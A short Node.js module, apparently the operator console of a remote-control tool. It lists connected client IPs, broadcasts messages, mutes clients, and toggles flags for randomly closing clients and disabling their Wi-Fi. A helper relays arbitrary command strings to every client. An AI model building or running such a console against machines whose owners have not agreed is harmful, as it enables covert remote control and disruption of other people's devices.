const {Server} = require('./server');
const {Message} = require('./msg');
/**
 *
 * @param {string[]} data
 */
function CMD(data) {
  const command = data.slice(1).join(' ');
  Server.broadcast(JSON.stringify(Message.new("cmd", command)))
}

function mute() {
  Server.broadcast(JSON.stringify(Message.new("mute", null)));
}


function list() {
  console.log(`Found ${Server.clients.size} clients connected: `);
  Server.clients.forEach((client) => {
    console.log(`Client ${client.ip}`);
  })
}

function sleep(delay) {
    var start = (new Date()).getTime();
    while((new Date()).getTime() - start < delay) {
        continue;
    }
}


function kmute() {
  for(var i = 0; i < 3; i++) {
    sleep(1000);
    console.log(i);
    Server.broadcast("mute") 
  }
}
  
/**
 * 
 * @param {String} msg 
 */
function processCommand(msg) {
  msg = msg.trim();
  if (msg.startsWith("!")) {
    const data = msg.split(" ");
    const method = data[0]
    switch (method) {
      case "!ls":
        list();
        break;
      case "!kmute":
        kmute();
        break;
      case "!rc":
        Server.randomClose = !Server.randomClose;
        console.log(Server.randomClose)
        break;
      case "!dw":
        Server.disableWLAN= !Server.disableWLAN;
        console.log(Server.disableWLAN)
        break;
      default:
        console.log(`Can't resolve server command: ${method}`);
    }
  }
  else {
    Server.broadcast(msg);
  }
}

module.exports = {
  processCommand,
}

